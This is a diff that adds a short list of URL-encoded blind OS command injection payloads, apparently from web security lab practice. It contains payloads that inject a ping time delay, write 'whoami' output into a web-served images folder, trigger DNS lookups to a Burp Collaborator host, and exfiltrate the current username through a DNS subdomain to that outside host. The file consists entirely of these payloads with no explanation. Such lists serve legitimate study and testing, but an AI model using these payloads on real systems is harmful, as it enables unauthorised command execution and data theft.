@@ -1,0 +1,7 @@
+||ping+-c+10+127.0.0.1||
+
+||whoami+>+/var/www/images/whoami.txt||
+
+||nslookup+5ekx07ccdhbglnqhcrtjn1gjtaz0np.burpcollaborator.net||
+
+||nslookup+`whoami`6ovd6g82qx0o5f3axit1ljpgq7wykn.burpcollaborator.net||
